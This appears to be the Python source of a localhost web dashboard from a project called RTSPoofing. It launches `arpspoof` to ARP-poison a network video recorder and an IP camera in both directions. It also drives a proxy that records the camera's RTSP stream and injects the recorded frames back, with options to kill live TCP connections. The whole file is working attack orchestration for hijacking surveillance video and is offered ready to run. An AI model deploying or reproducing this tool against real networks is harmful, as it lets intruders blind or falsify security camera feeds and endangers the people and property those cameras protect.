#!/usr/bin/env python3
"""
RTSPoofing dashboard — localhost web GUI to drive the Rust proxy and the
`arpspoof` processes that redirect the NVR↔camera traffic through it.

Behaviour:

    * Serves a single-page viewer at /, in Dashboard/web/index.html.
    * Owns at most one `rtspoofing` subprocess at a time (record / inject
      mode, with every CLI flag exposed on the page).
    * Owns at most two `arpspoof` subprocesses at a time — one poisoning
      the NVR (pretending to be the camera) and one poisoning the camera
      (pretending to be the NVR). Direction is selectable.
    * Fans the stdout+stderr of every subprocess out to any connected
      browser via a long-lived chunked response at /api/logs (NDJSON).
      Each entry carries a `src` tag ("proxy-out", "proxy-err",
      "arp-nvr", "arp-cam", "dash") so the page can colour-code them.
    * Keeps a ring buffer of the last N log lines so a fresh connect
      can paint recent history immediately.
    * All stdlib — no pip install. External deps are the proxy binary
      (--proxy-binary) and `arpspoof` from dsniff (--arpspoof-binary).

Scope:

    * One proxy process and up to two arpspoof processes per dashboard.
    * Loopback-only by default; the dashboard launches arbitrary
      subprocesses with user-supplied arguments, so exposing it on
      0.0.0.0 hands shell access to anyone on the LAN. Document loudly.
    * Arpspoof needs raw sockets — run the dashboard with sudo, or
      `setcap cap_net_raw+ep` the arpspoof binary once.

Usage:

    python3 dashboard.py --proxy-binary ../RE/target/release/rtspoofing
    # then open http://127.0.0.1:8090/
"""

from __future__ import annotations

import argparse
import http.server
import ipaddress
import json
import logging
import os
import shlex
import shutil
import signal
import socket
import subprocess
import threading
import time
from pathlib import Path
from queue import Empty, Full, Queue
from typing import Optional


log = logging.getLogger("dashboard")

WEB_DIR = Path(__file__).resolve().parent / "web"


# ---------- Shared log fan-out ----------

class LogBus:
    """
    Thread-safe log fan-out: one ring buffer + per-subscriber queues.
    Every subprocess controller writes through here, and /api/logs just
    subscribes.
    """

    def __init__(self, ring_size: int = 2000) -> None:
        self._ring_size = ring_size
        self._lock = threading.Lock()
        self._ring: list[dict] = []
        self._subs: list["Queue[dict]"] = []

    def emit(self, src: str, line: str) -> None:
        entry = {"ts": time.time(), "src": src, "line": line}
        with self._lock:
            self._ring.append(entry)
            if len(self._ring) > self._ring_size:
                # Trim in chunks so the common path is append-only.
                del self._ring[: len(self._ring) - self._ring_size + 200]
            for sub in list(self._subs):
                try:
                    sub.put_nowait(entry)
                except Full:
                    # Slow consumer: drop oldest to keep the live tail flowing.
                    try:
                        sub.get_nowait()
                    except Empty:
                        pass
                    try:
                        sub.put_nowait(entry)
                    except Full:
                        pass

    def subscribe(self) -> "Queue[dict]":
        q: "Queue[dict]" = Queue(maxsize=1024)
        with self._lock:
            for entry in self._ring[-200:]:
                try:
                    q.put_nowait(entry)
                except Full:
                    break
            self._subs.append(q)
        return q

    def unsubscribe(self, q: "Queue[dict]") -> None:
        with self._lock:
            try:
                self._subs.remove(q)
            except ValueError:
                pass


# ---------- Subprocess helpers ----------

def _popen(argv: list[str]) -> subprocess.Popen:
    return subprocess.Popen(
        argv,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        bufsize=1,              # line-buffered
        text=True,
        errors="replace",
        # New session so Ctrl-C on the dashboard doesn't propagate to the
        # child; we manage its lifetime explicitly.
        start_new_session=True,
    )


def _stop_proc(proc: subprocess.Popen, bus: LogBus, label: str, reason: str) -> None:
    if proc.poll() is not None:
        return
    bus.emit(label, f"stopping (pid={proc.pid}, reason={reason})")
    try:
        # SIGTERM the whole process group so any grandchild (e.g. tcpkill)
        # dies with the parent.
        pg = os.getpgid(proc.pid)
        os.killpg(pg, signal.SIGTERM)
    except (ProcessLookupError, PermissionError):
        try:
            proc.terminate()
        except OSError:
            pass
    try:
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        bus.emit(label, "SIGTERM timed out; sending SIGKILL")
        try:
            pg = os.getpgid(proc.pid)
            os.killpg(pg, signal.SIGKILL)
        except (ProcessLookupError, PermissionError):
            proc.kill()
        try:
            proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            pass


def _reader_thread(stream, bus: LogBus, label: str) -> None:
    try:
        for line in iter(stream.readline, ""):
            line = line.rstrip("\n")
            if not line:
                continue
            bus.emit(label, line)
    except (ValueError, OSError):
        # Stream closed under us during shutdown; expected.
        pass
    finally:
        try:
            stream.close()
        except OSError:
            pass


# ---------- Proxy process controller ----------

class ProxyController:
    """Owns at most one running `rtspoofing` subprocess."""

    _MODES = {"record", "inject"}
    _LOG_LEVELS = {"trace", "debug", "info", "warn", "error"}

    def __init__(self, binary: Path, bus: LogBus) -> None:
        self.binary = binary
        self.bus = bus
        self._proc: Optional[subprocess.Popen] = None
        self._lock = threading.Lock()
        self._cmdline: Optional[list[str]] = None
        self._started_at: float = 0.0

    def status(self) -> dict:
        with self._lock:
            running = self._proc is not None and self._proc.poll() is None
            return {
                "running": bool(running),
                "pid": self._proc.pid if running else None,
                "uptime": round(time.time() - self._started_at, 1) if running else 0,
                "cmdline": list(self._cmdline) if self._cmdline else None,
                "exit_code": self._proc.returncode if self._proc and not running else None,
                "binary": str(self.binary),
            }

    def start(self, args: dict) -> dict:
        argv = self._build_argv(args)
        with self._lock:
            self._stop_locked(reason="restart")
            self.bus.emit("dash", "spawning proxy: " + " ".join(shlex.quote(a) for a in argv))
            try:
                proc = _popen(argv)
            except FileNotFoundError as e:
                self.bus.emit("dash", f"proxy spawn failed: {e}")
                raise
            self._proc = proc
            self._cmdline = argv
            self._started_at = time.time()
            threading.Thread(target=_reader_thread,
                             args=(proc.stdout, self.bus, "proxy-out"),
                             daemon=True).start()
            threading.Thread(target=_reader_thread,
                             args=(proc.stderr, self.bus, "proxy-err"),
                             daemon=True).start()
            threading.Thread(target=self._wait_exit, args=(proc,), daemon=True).start()
        return self.status()

    def stop(self) -> dict:
        with self._lock:
            self._stop_locked(reason="user")
        return self.status()

    # ---- internals ----

    def _stop_locked(self, reason: str) -> None:
        if self._proc is None:
            return
        _stop_proc(self._proc, self.bus, "dash", reason)

    def _wait_exit(self, proc: subprocess.Popen) -> None:
        rc = proc.wait()
        self.bus.emit("dash", f"proxy exited (pid={proc.pid}, rc={rc})")

    # ---- argv builder ----
    #
    # Keep this in lock-step with RE/src/main.rs Cli. Only pass flags the
    # user actually set; leave the rest to the proxy's own defaults so a
    # typo in the dashboard doesn't silently change proxy behaviour.

    def _build_argv(self, args: dict) -> list[str]:
        mode = str(args.get("mode", "")).lower()
        if mode not in self._MODES:
            raise ValueError(f"mode must be one of {sorted(self._MODES)}, got {mode!r}")

        argv: list[str] = [str(self.binary), "--mode", mode]

        host = str(args.get("camera_host", "")).strip()
        if not host:
            raise ValueError("camera_host is required")
        argv += ["--camera-host", host]

        def _opt_num(flag: str, key: str, cast) -> None:
            v = args.get(key)
            if v is None or v == "":
                return
            try:
                argv.extend([flag, str(cast(v))])
            except (TypeError, ValueError) as e:
                raise ValueError(f"{key}: {e}") from None

        def _opt_str(flag: str, key: str) -> None:
            v = args.get(key)
            if v is None:
                return
            s = str(v).strip()
            if s:
                argv.extend([flag, s])

        def _opt_flag(flag: str, key: str) -> None:
            if bool(args.get(key)):
                argv.append(flag)

        _opt_str("--bind",            "bind")
        _opt_num("--listen-port",     "listen_port",     int)
        _opt_num("--camera-port",     "camera_port",     int)
        _opt_str("--capture-file",    "capture_file")
        _opt_num("--capture-frames",  "capture_frames",  int)
        _opt_num("--inject-delay",    "inject_delay",    float)
        _opt_num("--inject-fps",      "inject_fps",      float)
        _opt_str("--inject-ssrc",     "inject_ssrc")       # proxy parses hex-or-dec
        _opt_flag("--inject-only",    "inject_only")
        _opt_num("--rtcp-sr-interval","rtcp_sr_interval", float)
        _opt_str("--tcpkill-iface",   "tcpkill_iface")
        _opt_num("--tcpkill-delay",   "tcpkill_delay",   float)

        level = str(args.get("log_level", "")).strip().lower()
        if level:
            if level not in self._LOG_LEVELS:
                raise ValueError(f"log_level must be one of {sorted(self._LOG_LEVELS)}")
            argv += ["--log-level", level]

        return argv


# ---------- Arpspoof controller ----------

class ArpspoofController:
    """
    Owns up to two running `arpspoof` subprocesses:

        nvr  — poison NVR,    pretending to be the camera (arpspoof -t NVR CAM)
        cam  — poison camera, pretending to be the NVR    (arpspoof -t CAM NVR)

    Direction selector: "nvr" | "cam" | "both" (both is the standard
    MITM setup documented in the project README).

    Needs raw sockets — run the dashboard with sudo, or `setcap
    cap_net_raw+ep` the arpspoof binary.
    """

    _DIRECTIONS = ("nvr", "cam", "both")

    def __init__(self, binary: str, bus: LogBus) -> None:
        self.binary = binary
        self.bus = bus
        self._lock = threading.Lock()
        self._procs: dict[str, subprocess.Popen] = {}
        self._cmdlines: dict[str, list[str]] = {}
        self._started_at: dict[str, float] = {}
        self._last_exit: dict[str, Optional[int]] = {}

    # ---- public API ----

    def status(self) -> dict:
        with self._lock:
            legs: dict[str, dict] = {}
            for leg in ("nvr", "cam"):
                proc = self._procs.get(leg)
                running = proc is not None and proc.poll() is None
                legs[leg] = {
                    "running": bool(running),
                    "pid": proc.pid if running else None,
                    "uptime": round(time.time() - self._started_at.get(leg, 0.0), 1) if running else 0,
                    "cmdline": list(self._cmdlines.get(leg, [])) or None,
                    "exit_code": (proc.returncode if proc and not running else None)
                                 if proc else self._last_exit.get(leg),
                }
            any_running = any(l["running"] for l in legs.values())
            return {
                "running": any_running,
                "legs": legs,
                "binary": self.binary,
                "resolvable": shutil.which(self.binary) is not None
                               or (os.path.isabs(self.binary) and os.access(self.binary, os.X_OK)),
            }

    def start(self, args: dict) -> dict:
        iface = str(args.get("iface", "")).strip()
        nvr_ip = str(args.get("nvr_ip", "")).strip()
        cam_ip = str(args.get("cam_ip", "")).strip()
        direction = str(args.get("direction", "both")).strip().lower() or "both"

        if not iface:
            raise ValueError("iface is required")
        if not nvr_ip:
            raise ValueError("nvr_ip is required")
        if not cam_ip:
            raise ValueError("cam_ip is required")
        if direction not in self._DIRECTIONS:
            raise ValueError(f"direction must be one of {sorted(self._DIRECTIONS)}")
        _validate_ip(nvr_ip, "nvr_ip")
        _validate_ip(cam_ip, "cam_ip")
        if nvr_ip == cam_ip:
            raise ValueError("nvr_ip and cam_ip must differ")

        # Plan: direction → (target, impersonated_host)
        plan: dict[str, tuple[str, str]] = {}
        if direction in ("nvr", "both"):
            plan["nvr"] = (nvr_ip, cam_ip)   # tell NVR we are the camera
        if direction in ("cam", "both"):
            plan["cam"] = (cam_ip, nvr_ip)   # tell camera we are the NVR

        with self._lock:
            self._stop_all_locked(reason="restart")
            # Clear state for legs the new plan doesn't cover so the UI
            # doesn't keep showing stale cmdlines/exit-codes from the
            # previous run.
            for leg in ("nvr", "cam"):
                if leg not in plan:
                    self._procs.pop(leg, None)
                    self._cmdlines.pop(leg, None)
                    self._started_at.pop(leg, None)
                    self._last_exit.pop(leg, None)
            for leg, (target, host) in plan.items():
                argv = [self.binary, "-i", iface, "-t", target, host]
                self.bus.emit("arp-" + leg,
                              "spawning: " + " ".join(shlex.quote(a) for a in argv))
                try:
                    proc = _popen(argv)
                except FileNotFoundError as e:
                    self.bus.emit("arp-" + leg, f"spawn failed: {e}")
                    raise
                self._procs[leg] = proc
                self._cmdlines[leg] = argv
                self._started_at[leg] = time.time()
                threading.Thread(target=_reader_thread,
                                 args=(proc.stdout, self.bus, "arp-" + leg),
                                 daemon=True).start()
                threading.Thread(target=_reader_thread,
                                 args=(proc.stderr, self.bus, "arp-" + leg),
                                 daemon=True).start()
                threading.Thread(target=self._wait_exit,
                                 args=(proc, leg),
                                 daemon=True).start()
        return self.status()

    def stop(self) -> dict:
        with self._lock:
            self._stop_all_locked(reason="user")
        return self.status()

    # ---- internals ----

    def _stop_all_locked(self, reason: str) -> None:
        for leg, proc in list(self._procs.items()):
            _stop_proc(proc, self.bus, "arp-" + leg, reason)

    def _wait_exit(self, proc: subprocess.Popen, leg: str) -> None:
        rc = proc.wait()
        self._last_exit[leg] = rc
        self.bus.emit("arp-" + leg, f"exited (pid={proc.pid}, rc={rc})")


def _validate_ip(s: str, label: str) -> None:
    try:
        ipaddress.ip_address(s)
    except ValueError:
        raise ValueError(f"{label}: {s!r} is not a valid IP") from None


# ---------- HTTP server ----------

class _ThreadingHTTPServer(http.server.ThreadingHTTPServer):
    allow_reuse_address = True
    daemon_threads = True


def _make_handler(proxy: ProxyController, arp: ArpspoofController, bus: LogBus):
    class Handler(http.server.BaseHTTPRequestHandler):
        # Reroute http.server's noisy default logging into our logger.
        def log_message(self, fmt: str, *args) -> None:  # noqa: A002, ARG002
            log.debug("http %s - %s", self.address_string(), fmt % args)

        # ---- routes ----

        def do_GET(self) -> None:  # noqa: N802
            if self.path in ("/", "/index.html"):
                self._serve_static("index.html", "text/html; charset=utf-8")
                return
            if self.path == "/api/status":
                self._json(200, {
                    "proxy": proxy.status(),
                    "arp":   arp.status(),
                })
                return
            if self.path == "/api/logs":
                self._serve_logs()
                return
            self.send_error(404, "not found")

        def do_POST(self) -> None:  # noqa: N802
            if self.path == "/api/start":
                self._handle(lambda b: proxy.start(b))
                return
            if self.path == "/api/stop":
                self._json(200, proxy.stop())
                return
            if self.path == "/api/arp/start":
                self._handle(lambda b: arp.start(b))
                return
            if self.path == "/api/arp/stop":
                self._json(200, arp.stop())
                return
            if self.path == "/api/stop_all":
                arp.stop()
                proxy.stop()
                self._json(200, {"proxy": proxy.status(), "arp": arp.status()})
                return
            self.send_error(404, "not found")

        # ---- helpers ----

        def _handle(self, fn) -> None:
            try:
                body = self._read_json()
                result = fn(body)
            except ValueError as e:
                self._json(400, {"error": str(e)})
                return
            except FileNotFoundError as e:
                self._json(500, {"error": f"binary not found: {e}"})
                return
            except OSError as e:
                self._json(500, {"error": f"spawn failed: {e}"})
                return
            self._json(200, result)

        def _read_json(self) -> dict:
            length = int(self.headers.get("Content-Length", "0"))
            if length <= 0 or length > 65536:
                raise ValueError("invalid request body")
            raw = self.rfile.read(length)
            try:
                obj = json.loads(raw.decode("utf-8"))
            except (UnicodeDecodeError, json.JSONDecodeError) as e:
                raise ValueError(f"invalid JSON: {e}") from None
            if not isinstance(obj, dict):
                raise ValueError("body must be a JSON object")
            return obj

        def _json(self, code: int, obj: dict) -> None:
            payload = json.dumps(obj).encode("utf-8")
            self.send_response(code)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Content-Length", str(len(payload)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            try:
                self.wfile.write(payload)
            except (BrokenPipeError, ConnectionResetError):
                pass

        def _serve_static(self, name: str, content_type: str) -> None:
            path = (WEB_DIR / name).resolve()
            if WEB_DIR.resolve() not in path.parents and path != (WEB_DIR / name).resolve():
                self.send_error(403, "forbidden")
                return
            try:
                data = path.read_bytes()
            except OSError:
                self.send_error(404, "not found")
                return
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            try:
                self.wfile.write(data)
            except (BrokenPipeError, ConnectionResetError):
                pass

        def _serve_logs(self) -> None:
            # NDJSON over HTTP chunked. One log entry per line as a JSON object.
            self.send_response(200)
            self.send_header("Content-Type", "application/x-ndjson; charset=utf-8")
            self.send_header("Transfer-Encoding", "chunked")
            self.send_header("Cache-Control", "no-store")
            self.send_header("X-Accel-Buffering", "no")
            self.end_headers()
            try:
                self.connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except OSError:
                pass

            q = bus.subscribe()
            try:
                while True:
                    try:
                        entry = q.get(timeout=1.0)
                    except Empty:
                        # Idle keepalive — a bare newline keeps NAT/proxies open
                        # without appearing in the parsed stream.
                        if not self._send_chunk(b"\n"):
                            break
                        continue
                    payload = (json.dumps(entry, separators=(",", ":")) + "\n").encode("utf-8")
                    if not self._send_chunk(payload):
                        break
            finally:
                bus.unsubscribe(q)
                try:
                    self.wfile.write(b"0\r\n\r\n"); self.wfile.flush()
                except (BrokenPipeError, ConnectionResetError, OSError):
                    pass

        def _send_chunk(self, data: bytes) -> bool:
            try:
                self.wfile.write(f"{len(data):x}\r\n".encode("ascii"))
                self.wfile.write(data)
                self.wfile.write(b"\r\n")
                self.wfile.flush()
                return True
            except (BrokenPipeError, ConnectionResetError, OSError):
                return False

    return Handler


# ---------- Main ----------

def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(
        description="Localhost web GUI to drive the rtspoofing proxy and arpspoof.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "The dashboard launches rtspoofing and arpspoof subprocesses with\n"
            "the arguments sent by the browser. Keep --host loopback-only on\n"
            "untrusted LANs: exposing this on 0.0.0.0 lets any machine on the\n"
            "network spawn these processes under your account.\n"
        ),
    )
    ap.add_argument("--proxy-binary", default="../RE/target/release/rtspoofing",
                    help="path to the rtspoofing binary (default: ../RE/target/release/rtspoofing)")
    ap.add_argument("--arpspoof-binary", default="arpspoof",
                    help="arpspoof binary or absolute path (default: arpspoof — resolved via PATH)")
    ap.add_argument("--host", default="127.0.0.1",
                    help="bind host for the dashboard (default: 127.0.0.1)")
    ap.add_argument("--port", type=int, default=8090,
                    help="dashboard HTTP port (default: 8090)")
    ap.add_argument("--log-level", default="INFO",
                    choices=["DEBUG", "INFO", "WARNING", "ERROR"])
    return ap.parse_args()


def main() -> int:
    args = parse_args()
    logging.basicConfig(
        level=getattr(logging, args.log_level.upper()),
        format="[%(asctime)s] %(levelname)-7s %(name)s: %(message)s",
        datefmt="%H:%M:%S",
    )

    binary = Path(args.proxy_binary).expanduser().resolve()
    if not binary.exists():
        log.error("proxy binary not found at %s — build it first (cd RE && cargo build --release)", binary)
        return 1
    if not os.access(binary, os.X_OK):
        log.error("proxy binary at %s is not executable", binary)
        return 1

    # arpspoof is only required when the user actually clicks Start on the
    # ARP panel; we don't fail-fast if it's missing. Just warn so the user
    # sees it in the terminal, and the UI will show "not found" too.
    if shutil.which(args.arpspoof_binary) is None and not (
        os.path.isabs(args.arpspoof_binary) and os.access(args.arpspoof_binary, os.X_OK)
    ):
        log.warning("arpspoof not found on PATH (%s) — ARP panel will error on Start until it is installed",
                    args.arpspoof_binary)

    bus = LogBus()
    proxy = ProxyController(binary, bus)
    arp = ArpspoofController(args.arpspoof_binary, bus)
    handler_cls = _make_handler(proxy, arp, bus)

    try:
        server = _ThreadingHTTPServer((args.host, args.port), handler_cls)
    except OSError as e:
        log.error("cannot bind %s:%d: %s", args.host, args.port, e)
        return 1

    log.info("dashboard at http://%s:%d/   (proxy=%s, arpspoof=%s)",
             args.host, args.port, binary, args.arpspoof_binary)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log.info("Ctrl-C — shutting down")
    finally:
        arp.stop()
        proxy.stop()
        server.server_close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
